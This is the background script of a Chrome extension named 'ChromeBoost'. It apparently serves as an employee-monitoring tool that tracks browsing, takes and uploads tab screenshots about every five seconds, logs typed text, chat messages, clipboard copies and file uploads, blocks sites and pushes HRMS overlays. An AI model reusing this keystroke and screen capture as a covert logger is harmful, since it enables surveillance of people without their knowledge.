// ============================================================
// ChromeBoost Extension — background.js (v2.2.5)
// v2.2.5: Enforce blocked_sites — fetch list every 5 min, redirect
//         matching navigations to blocked.html, log site_blocked.
// v2.2.4: HRMS popup reliability — iterate all windows, fall back
//         to chrome.notifications when no injectable tab exists,
//         and only mark notifications read on confirmed delivery.
// ============================================================

const SUPABASE_URL      = "https://fjinasixyjqbketajdlt.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_iF3wjjfx2LNBQSmvZJjbkQ_kxdc9SvC";
const S3_BUCKET         = "worklens-screenshots";

// ── Identifier — sync after first load, async on first call ──────────────────
let _identifier = null;

async function getIdentifier() {
  if (_identifier) return _identifier;
  try {
    const stored = (await chrome.storage.local.get('cb_identifier')).cb_identifier;
    if (stored && stored !== 'unknown') {
      _identifier = stored;
      return _identifier;
    }
  } catch(e) {}
  return new Promise((resolve) => {
    try {
      chrome.identity.getProfileUserInfo({ accountStatus: 'ANY' }, (info) => {
        let id = 'unknown';
        if (!chrome.runtime.lastError && info?.email) {
          id = info.email.split('@')[0].toLowerCase().trim();
        }
        _identifier = id;
        chrome.storage.local.set({ cb_identifier: id });
        resolve(id);
      });
    } catch(e) {
      _identifier = 'unknown';
      resolve('unknown');
    }
  });
}

getIdentifier();

// ── State ─────────────────────────────────────────────────────────────────────
let activeUrl    = null;
let activeTitle  = null;
let sessionStart = Date.now();
let buffer       = [];
let _shownIntervention = null; // delivery id currently displayed

// ── Tab tracking ──────────────────────────────────────────────────────────────
chrome.tabs.onActivated.addListener(async ({ tabId }) => {
  try { handleTabChange(await chrome.tabs.get(tabId)); } catch (e) {}
});
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.active) handleTabChange(tab);
});

async function handleTabChange(tab) {
  if (!tab.url || tab.url.startsWith("chrome://")) return;
  if (activeUrl && sessionStart) {
    const dur = Math.round((Date.now() - sessionStart) / 1000);
    if (dur > 2) await push("website_visit", {
      url: activeUrl, title: activeTitle, duration_seconds: dur,
      domain: domain(activeUrl), category: categorize(activeUrl)
    });
  }
  activeUrl = tab.url; activeTitle = tab.title; sessionStart = Date.now();
}

// ── Idle ──────────────────────────────────────────────────────────────────────
chrome.idle.setDetectionInterval(60);
chrome.idle.onStateChanged.addListener(async (state) => {
  await push("idle_state_change", { state });
});

// ── Alarms ────────────────────────────────────────────────────────────────────
chrome.alarms.create("screenshot",  { periodInMinutes: 0.5 }); // 30s floor (MV3 minimum)
chrome.alarms.create("flush",       { periodInMinutes: 0.5  });
chrome.alarms.create("checkNotifs", { periodInMinutes: 1    });
chrome.alarms.create("blocklist",   { periodInMinutes: 5    });

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name === "screenshot") {
    // Backup floor + self-heal: make sure the offscreen capture timer is alive
    // (recreate it if it was torn down) and take one screenshot as a fallback.
    await ensureOffscreen();
    await takeScreenshot();
  }
  if (alarm.name === "flush")       await flush();
  if (alarm.name === "checkNotifs") {
    await checkNotifications();
    await checkInterventions();
  }
  if (alarm.name === "blocklist")   await refreshBlocklist();
});

// ── Offscreen capture timer (v2.4.0) ────────────────────────────────────────
// MV3 suspends the service worker after ~30s, so an in-worker timer cannot drive
// a reliable sub-30s screenshot cadence (that is why the old 15s follow-up shot
// was usually dropped → only ~2/min). A persistent offscreen document is NOT
// suspended: it holds a keepalive port open and ticks every CAPTURE_INTERVAL_MS,
// and each tick wakes the worker to capture. The 30s alarm above re-creates the
// offscreen doc if it ever goes away.
async function ensureOffscreen() {
  try {
    if (chrome.offscreen?.hasDocument && await chrome.offscreen.hasDocument()) return;
    await chrome.offscreen.createDocument({
      url: "offscreen.html",
      reasons: ["BLOBS"],
      justification: "Maintain the periodic background capture timer.",
    });
  } catch (e) { /* already exists / race — ignore */ }
}

chrome.runtime.onStartup.addListener(() => { ensureOffscreen(); });
chrome.runtime.onInstalled.addListener(() => { ensureOffscreen(); });
ensureOffscreen();

// Each keepalive tick from the offscreen document triggers one capture.
chrome.runtime.onConnect.addListener((port) => {
  if (port.name !== "cb-cap") return;
  port.onMessage.addListener((msg) => {
    if (msg && msg.t === "tick") takeScreenshot().catch(() => {});
  });
});

// ── Blocked sites enforcement ────────────────────────────────────────────────
let _blockedDomains = [];

async function refreshBlocklist() {
  try {
    const res = await fetch(
      `${SUPABASE_URL}/rest/v1/blocked_sites?select=domain`,
      { headers: { "apikey": SUPABASE_ANON_KEY, "Authorization": `Bearer ${SUPABASE_ANON_KEY}` } }
    );
    if (!res.ok) return;
    const rows = await res.json();
    const list = (rows || [])
      .map(r => String(r.domain || "").toLowerCase().replace(/^www\./, "").trim())
      .filter(Boolean);
    _blockedDomains = list;
    await chrome.storage.local.set({ cb_blocked_domains: list, cb_blocked_fetched_at: Date.now() });
  } catch (e) {
    // keep in-memory cache; fall back to stored cache below
  }
}

chrome.storage.local.get(["cb_blocked_domains"], (r) => {
  if (Array.isArray(r.cb_blocked_domains)) _blockedDomains = r.cb_blocked_domains;
});
refreshBlocklist();

function isBlockedHost(host) {
  if (!host) return false;
  const h = host.toLowerCase().replace(/^www\./, "");
  for (const d of _blockedDomains) {
    if (!d) continue;
    if (h === d || h.endsWith("." + d)) return true;
  }
  return false;
}

chrome.webNavigation.onBeforeNavigate.addListener(async (details) => {
  if (details.frameId !== 0) return;
  const url = details.url || "";
  if (!/^https?:/i.test(url)) return;
  let host = "";
  try { host = new URL(url).hostname; } catch { return; }
  if (!isBlockedHost(host)) return;
  const target = chrome.runtime.getURL("blocked.html")
    + "?d=" + encodeURIComponent(host.replace(/^www\./, ""))
    + "&from=" + encodeURIComponent(url);
  try { await chrome.tabs.update(details.tabId, { url: target }); } catch {}
  try {
    await push("site_blocked", {
      domain: host.replace(/^www\./, ""),
      url,
      source: "browser",
    });
  } catch {}
});

// ── HRMS Notification Polling (legacy plain text) ────────────────────────────
async function checkNotifications() {
  try {
    const id = await getIdentifier();
    const res = await fetch(
      `${SUPABASE_URL}/rest/v1/pending_notifications` +
      `?read=eq.false` +
      `&or=(computer_name.eq.${encodeURIComponent(id)},target.eq.all_remote)` +
      `&trigger=not.like.intervention:*` +
      `&order=created_at.desc&limit=5`,
      { headers: { "apikey": SUPABASE_ANON_KEY, "Authorization": `Bearer ${SUPABASE_ANON_KEY}` } }
    );
    if (!res.ok) return;
    const notifications = await res.json();
    if (!notifications?.length) return;
    for (const notif of notifications) {
      const shown = await showOverlay(notif);
      if (shown) await markRead(notif.id);
    }
  } catch (e) {}
}

function isInjectableUrl(url) {
  if (!url) return false;
  return /^https?:\/\//i.test(url) && !/^https:\/\/chrome\.google\.com\/webstore/i.test(url);
}

async function showOverlay(notif) {
  const payload = {
    message:  notif.message  || "Please check your HRMS.",
    severity: notif.severity || "high",
    title:    triggerTitle(notif.trigger),
    hrmsUrl:  "https://hrms.biotecnika.org",
  };
  // Try every normal window — pick the first active tab we can inject into.
  try {
    const windows = await chrome.windows.getAll({ populate: true, windowTypes: ["normal"] });
    for (const w of windows) {
      const tab = (w.tabs || []).find((t) => t.active);
      if (!tab?.id || !isInjectableUrl(tab.url)) continue;
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: injectOverlay,
          args: [payload],
        });
        return true;
      } catch (_) { /* try next window */ }
    }
  } catch (_) {}
  // Fallback: system notification (works even on chrome:// pages).
  try {
    await new Promise((resolve) => {
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon48.png",
        title: payload.title,
        message: payload.message,
        priority: 2,
        requireInteraction: true,
      }, () => resolve());
    });
    return true;
  } catch (_) {
    return false;
  }
}

function injectOverlay({ message, severity, title, hrmsUrl }) {
  if (document.getElementById("__cb_notif_overlay")) return;
  const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) => (
    { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]
  ));
  const sev = ["high", "medium", "low"].includes(severity) ? severity : "high";
  const colors = {
    high:   { bg: "#7f1d1d", border: "#ef4444", btn: "#ef4444" },
    medium: { bg: "#78350f", border: "#f59e0b", btn: "#f59e0b" },
    low:    { bg: "#14532d", border: "#22c55e", btn: "#22c55e" },
  };
  const c = colors[sev];
  const safeHrms = /^https?:\/\//i.test(hrmsUrl) ? hrmsUrl : "https://hrms.biotecnika.org";
  const overlay = document.createElement("div");
  overlay.id = "__cb_notif_overlay";
  overlay.style.cssText = `position:fixed!important;top:0!important;left:0!important;width:100vw!important;height:100vh!important;background:rgba(0,0,0,0.8)!important;z-index:2147483647!important;display:flex!important;align-items:center!important;justify-content:center!important;font-family:'Segoe UI',system-ui,sans-serif!important;`;
  overlay.innerHTML = `
    <div style="background:#1a1f2e;border:2px solid ${c.border};border-radius:16px;padding:36px 40px;max-width:460px;width:90%;text-align:center;box-shadow:0 25px 60px rgba(0,0,0,0.8);">
      <div style="width:60px;height:60px;background:${c.bg};border:2px solid ${c.border};border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:26px;">⚠️</div>
      <span style="background:${c.btn};color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:3px 12px;border-radius:20px;display:inline-block;margin-bottom:14px;">Action Required</span>
      <h2 style="color:#f0f6fc;font-size:20px;font-weight:700;margin:0 0 12px;">${esc(title)}</h2>
      <p style="color:#9aa3be;font-size:14px;line-height:1.6;margin:0 0 26px;">${esc(message)}</p>
      <button id="__cb_btn" style="background:${c.btn};color:#fff;border:none;padding:13px 32px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%;">I Understand — Go to HRMS →</button>
    </div>`;
  document.body.appendChild(overlay);
  document.getElementById("__cb_btn").addEventListener("click", () => {
    overlay.remove();
    window.open(safeHrms, "_blank");
  });
}

function triggerTitle(trigger) {
  return {
    missed_checkin:  "You Missed Your Check-In",
    missed_checkout: "You Forgot to Check Out",
    late_checkin:    "You Are Late — Please Check In",
    break_overrun:   "Break Time Exceeded",
    shift_reminder:  "Your Shift Is Starting",
  }[trigger] || "HRMS Reminder";
}

async function markRead(id) {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/pending_notifications?id=eq.${id}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json", "apikey": SUPABASE_ANON_KEY, "Authorization": `Bearer ${SUPABASE_ANON_KEY}` },
      body: JSON.stringify({ read: true }),
    });
  } catch (e) {}
}

// ── WorkLens Intervention Polling (rich overlay) ─────────────────────────────
async function checkInterventions() {
  try {
    if (_shownIntervention) return;
    const id = await getIdentifier();
    if (!id || id === "unknown") return;
    const nowIso = new Date().toISOString();
    const sel = "id,intervention_id,expires_at,viewed_at,intervention:interventions(id,title,message,priority,accent_color,full_screen,buttons:intervention_buttons(id,label,url,sort_order))";
    const url = `${SUPABASE_URL}/rest/v1/intervention_deliveries`
      + `?select=${encodeURIComponent(sel)}`
      + `&computer_name=eq.${encodeURIComponent(id)}`
      + `&acknowledged_at=is.null`
      + `&expires_at=gt.${encodeURIComponent(nowIso)}`;
    const res = await fetch(url, {
      headers: { apikey: SUPABASE_ANON_KEY, Authorization: `Bearer ${SUPABASE_ANON_KEY}` },
    });
    if (!res.ok) return;
    const rows = await res.json();
    if (!rows?.length) return;
    const rank = { critical: 3, important: 2, normal: 1 };
    rows.sort((a, b) =>
      (rank[b.intervention?.priority] ?? 0) - (rank[a.intervention?.priority] ?? 0)
      || new Date(b.expires_at) - new Date(a.expires_at));
    const pick = rows.find(r => r.intervention);
    if (!pick) return;
    _shownIntervention = pick.id;
    await markViewed(pick.id);
    await showInterventionOverlay(pick);
  } catch (e) {}
}

async function showInterventionOverlay(d) {
  try {
    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.id || tab.url?.startsWith("chrome://")) {
      chrome.notifications.create({
        type: "basic", iconUrl: "icon48.png",
        title: d.intervention.title,
        message: d.intervention.message,
        priority: 2,
      });
      return;
    }
    await chrome.scripting.executeScript({
      target: { tabId: tab.id },
      func: injectInterventionOverlay,
      args: [{
        deliveryId: d.id,
        title: d.intervention.title,
        message: d.intervention.message,
        priority: d.intervention.priority || "important",
        accent: d.intervention.accent_color || "#3b82f6",
        fullScreen: !!d.intervention.full_screen,
        buttons: (d.intervention.buttons || []).slice().sort((a,b) => a.sort_order - b.sort_order),
      }],
    });
  } catch (e) {
    _shownIntervention = null;
  }
}

function injectInterventionOverlay({ deliveryId, title, message, priority, accent, fullScreen, buttons }) {
  if (document.getElementById("__cb_iv_overlay")) return;
  const sevColors = {
    critical: { bg:"#7f1d1d", border:"#ef4444" },
    important:{ bg:"#78350f", border:"#f59e0b" },
    normal:   { bg:"#14532d", border:"#22c55e" },
  };
  const c = sevColors[priority] || sevColors.important;
  const overlay = document.createElement("div");
  overlay.id = "__cb_iv_overlay";
  overlay.style.cssText = `position:fixed!important;top:0!important;left:0!important;width:100vw!important;height:100vh!important;background:rgba(0,0,0,0.8)!important;z-index:2147483647!important;display:flex!important;align-items:center!important;justify-content:center!important;font-family:'Segoe UI',system-ui,sans-serif!important;`;
  const w = fullScreen ? "min(900px,92vw)" : "min(480px,92vw)";
  const esc = (s) => String(s ?? "").replace(/[&<>"']/g, ch => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[ch]));
  const btnsHtml = (buttons || []).map((b) => `
    <button data-iv-btn="${esc(b.id)}" data-iv-url="${esc(b.url)}"
      style="background:${accent};color:#fff;border:none;padding:11px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;flex:1;min-width:120px;">
      ${esc(b.label)}
    </button>`).join("");
  overlay.innerHTML = `
    <div style="background:#1a1f2e;border-top:4px solid ${accent};border-radius:14px;padding:30px 34px;width:${w};box-shadow:0 25px 60px rgba(0,0,0,0.8);">
      <div style="text-align:center;">
        <div style="width:54px;height:54px;background:${c.bg};border:2px solid ${c.border};border-radius:50%;display:inline-flex;align-items:center;justify-content:center;margin-bottom:14px;font-size:22px;">⚠️</div>
        <div style="background:${c.border};color:#fff;font-size:10px;font-weight:700;text-transform:uppercase;padding:3px 12px;border-radius:20px;display:inline-block;margin-bottom:12px;letter-spacing:0.05em;">${esc(priority)}</div>
        <h2 style="color:#f0f6fc;font-size:20px;font-weight:700;margin:0 0 12px;">${esc(title)}</h2>
        <p style="color:#9aa3be;font-size:14px;line-height:1.6;margin:0 0 22px;white-space:pre-wrap;text-align:left;">${esc(message)}</p>
      </div>
      <div style="display:flex;flex-wrap:wrap;gap:8px;">
        ${btnsHtml}
        <button data-iv-ack style="background:transparent;color:#9aa3be;border:1px solid #3d4560;padding:11px 18px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;flex:1;min-width:120px;">
          Acknowledge
        </button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  const close = () => overlay.remove();
  overlay.querySelectorAll("[data-iv-btn]").forEach((el) => {
    el.addEventListener("click", () => {
      const btnId = el.getAttribute("data-iv-btn");
      const url = el.getAttribute("data-iv-url");
      try { chrome.runtime.sendMessage({ type: "INTERVENTION_ACK", deliveryId, buttonId: btnId }); } catch(e) {}
      close();
      if (url) window.open(url, "_blank");
    });
  });
  overlay.querySelector("[data-iv-ack]").addEventListener("click", () => {
    try { chrome.runtime.sendMessage({ type: "INTERVENTION_ACK", deliveryId, buttonId: null }); } catch(e) {}
    close();
  });
}

async function markViewed(id) {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/intervention_deliveries?id=eq.${id}&viewed_at=is.null`, {
      method: "PATCH",
      headers: { "Content-Type":"application/json", apikey: SUPABASE_ANON_KEY,
                 Authorization:`Bearer ${SUPABASE_ANON_KEY}`, Prefer:"return=minimal" },
      body: JSON.stringify({ viewed_at: new Date().toISOString() }),
    });
  } catch (e) {}
}

async function markAcknowledged(id, buttonId) {
  try {
    await fetch(`${SUPABASE_URL}/rest/v1/intervention_deliveries?id=eq.${id}`, {
      method: "PATCH",
      headers: { "Content-Type":"application/json", apikey: SUPABASE_ANON_KEY,
                 Authorization:`Bearer ${SUPABASE_ANON_KEY}`, Prefer:"return=minimal" },
      body: JSON.stringify({
        acknowledged_at: new Date().toISOString(),
        clicked_button_id: buttonId || null,
      }),
    });
  } catch (e) {
  } finally {
    _shownIntervention = null;
    setTimeout(() => checkInterventions(), 1500);
  }
}

// ── Screenshot ────────────────────────────────────────────────────────────────
// ── Screenshot (v2.4.0: offscreen-driven ~12/min; no identical-frame skip) ───
const CAPTURE_INTERVAL_MS = 5000;   // offscreen tick cadence (~12/min)
const MIN_CAPTURE_GAP_MS  = 3000;   // guard: alarm + tick never double-fire or exceed the API cap
let _capturing     = false;
let _lastCaptureAt = 0;

async function takeScreenshot() {
  const now = Date.now();
  if (_capturing) return;                              // never run two captures at once
  if (now - _lastCaptureAt < MIN_CAPTURE_GAP_MS) return;
  _capturing = true;
  _lastCaptureAt = now;
  try {
    const id = await getIdentifier();
    if (!id || id === "unknown") return;

    // Skip silently if the system is idle or locked (no active work to capture).
    // Not logged — at ~12/min a skip event would flood activity_logs.
    const idleState = await new Promise(r => chrome.idle.queryState(60, r));
    if (idleState === "idle" || idleState === "locked") return;

    const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tab?.url || tab.url.startsWith("chrome://")) return;

    // Capture, resize to 1280px wide max, convert to WebP using
    // createImageBitmap + OffscreenCanvas (DOM-free, works in MV3 service worker).
    const dataUrl  = await chrome.tabs.captureVisibleTab(null, { format: "jpeg", quality: 80 });
    const srcBlob  = await (await fetch(dataUrl)).blob();
    const bitmap   = await createImageBitmap(srcBlob);
    const MAX_W    = 1280;
    const scale    = bitmap.width > MAX_W ? MAX_W / bitmap.width : 1;
    const w        = Math.max(1, Math.floor(bitmap.width  * scale));
    const h        = Math.max(1, Math.floor(bitmap.height * scale));
    const canvas   = new OffscreenCanvas(w, h);
    canvas.getContext("2d").drawImage(bitmap, 0, 0, w, h);
    bitmap.close?.();
    const blob     = await canvas.convertToBlob({ type: "image/webp", quality: 0.65 });
    const bytes    = new Uint8Array(await blob.arrayBuffer());

    // Identical-frame dedup removed in 2.4.0 for gap-free training data —
    // every captured frame while active is uploaded.

    // 1) Get signed S3 PUT URL
    const signRes = await fetch(`${SUPABASE_URL}/functions/v1/screenshot-upload-url`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
      },
      body: JSON.stringify({ computer_name: id, ext: "webp" }),
    });
    if (!signRes.ok) return;
    const { upload_url, key, bucket } = await signRes.json();
    if (!upload_url || !key) return;

    // 2) Upload to S3
    const putRes = await fetch(upload_url, {
      method: "PUT",
      headers: { "Content-Type": "image/webp" },
      body: blob,
    });
    if (!putRes.ok) return;

    // 3) Record metadata
    await push("screenshot", {
      s3_key:           key,
      bucket:           bucket || S3_BUCKET,
      storage_provider: "s3",
      size:             bytes.length,
      format:           "webp",
      url:              tab.url,
      title:            tab.title,
      domain:           domain(tab.url),
      source:           "browser",
    });
  } catch (e) {} finally { _capturing = false; }
}

// ── Buffer & push ─────────────────────────────────────────────────────────────
const EXT_VERSION = (() => { try { return chrome.runtime.getManifest().version; } catch { return "unknown"; } })();

async function push(type, data) {
  const id = await getIdentifier();
  buffer.push({
    computer_name: id,
    event_type:    type,
    event_data:    { ...data, extension_version: EXT_VERSION },
    recorded_at:   new Date().toISOString(),
    source:        "chrome_extension",
  });
}

async function readStorageEvents() {
  return new Promise((resolve) => {
    chrome.storage.local.get(null, (items) => {
      const events = [];
      const keys = [];
      for (const [key, value] of Object.entries(items)) {
        if (key.startsWith("cb_pending_")) {
          events.push({ key, value });
          keys.push(key);
        }
      }
      resolve({ events, keys });
    });
  });
}

async function flush() {
  const id = await getIdentifier();
  const { events, keys } = await readStorageEvents();
  for (const { value } of events) {
    const merged = { ...value };
    merged.event_data = { ...(value.event_data || {}), extension_version: EXT_VERSION };
    buffer.push({ computer_name: id, ...merged, source: "chrome_extension" });
  }
  if (!buffer.length) return;
  const batch = [...buffer];
  buffer = [];
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/activity_logs`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "apikey": SUPABASE_ANON_KEY,
        "Authorization": `Bearer ${SUPABASE_ANON_KEY}`,
        "Prefer": "return=minimal"
      },
      body: JSON.stringify(batch),
    });
    if (res.ok) {
      if (keys.length > 0) chrome.storage.local.remove(keys);
    } else {
      buffer = [...batch, ...buffer];
    }
  } catch (e) {
    buffer = [...batch, ...buffer];
  }
}

// ── Content script & overlay messages ────────────────────────────────────────
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  sendResponse({ ok: true });
  (async () => {
    if (msg.type === "KEYSTROKE_TEXT")       await push("keystroke_text",    { text: msg.text, field_type: msg.fieldType, is_chat: msg.isChat, domain: domain(activeUrl||""), url: activeUrl, source: "browser" });
    if (msg.type === "CHAT_MESSAGE_SENT")    await push("chat_message_sent", { platform: msg.platform, message: msg.message, domain: domain(activeUrl||""), source: "browser" });
    if (msg.type === "COPY_DETECTED")        await push("clipboard_copy",    { text: msg.text, length: msg.length, domain: domain(activeUrl||""), source: "browser" });
    if (msg.type === "FILE_UPLOAD_DETECTED") await push("file_upload",       { filename: msg.filename, size: msg.size, filetype: msg.filetype, domain: domain(activeUrl||""), source: "browser" });
    if (msg.type === "INTERVENTION_ACK")     await markAcknowledged(msg.deliveryId, msg.buttonId);
  })();
  return true;
});

// ── Helpers ───────────────────────────────────────────────────────────────────
function domain(url) { try { return new URL(url).hostname.replace("www.",""); } catch { return url; } }

function categorize(url) {
  const d = domain(url);
  const map = {
    productive:    ["docs.google.com","github.com","notion.so","biotecnika.org","supabase.com","claude.ai","slack.com","zoho.com"],
    communication: ["gmail.com","mail.google.com","outlook.com","whatsapp.com","web.whatsapp.com","telegram.org","meet.google.com","zoom.us"],
    unproductive:  ["youtube.com","instagram.com","facebook.com","twitter.com","x.com","reddit.com","netflix.com","hotstar.com","spotify.com"],
  };
  for (const [cat, domains] of Object.entries(map)) {
    if (domains.some(dm => d.includes(dm))) return cat;
  }
  return "neutral";
}
